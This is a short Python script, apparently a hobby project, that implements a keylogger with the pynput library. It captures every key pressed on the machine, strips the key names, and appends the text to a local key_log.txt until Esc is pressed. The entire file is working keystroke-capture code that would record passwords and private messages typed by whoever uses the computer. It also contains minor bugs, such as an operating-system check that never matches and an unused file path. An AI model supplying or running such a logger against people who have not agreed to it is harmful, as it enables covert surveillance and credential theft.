# Evangellos Wiegers
# Note: be sure to have pynput installed

from pynput.keyboard import Key, Listener
from pathlib import Path
from sys import platform

key_count = 0
line_count = 0
keys = []

def on_press(key):
    '''
    Function to record key pressed
    :param key: the key pressed according to the listener
    :post-condition: key recorded
    :return: N/A
    '''
    global keys, key_count, line_count, alphabet
    keys.append(key)
    key_count += 1
    line_count += 1
    if key_count >= 10:
        write_file(keys, line_count)
        if line_count >= 60:
            line_count = 0
        key_count = 0
        keys = []

    # print(str(key), end='')


def on_release(key):
    '''
    function to release after key has been escaped
    :param key: escape key
    :return: False
    '''
    if key == Key.esc:
        return False


def write_file(keys, line_count):

    #getting file name and path
    file_name = "key_log.txt"
    file_path = Path("./" + file_name)
    #checking OS
    if platform.lower() == "windows":
        file_path = Path(".\\" + file_name)
    #determing whether to write or append
    if file_path.is_file():
        letter = "a"
    else:
        letter = "w"
    #writing keys to file
    with open(file_name, letter) as file:
        if line_count >= 60:
            file.write("\n")
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write(" ")
            elif k.find("Key") == -1:
                file.write(k)



if __name__ == '__main__':
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
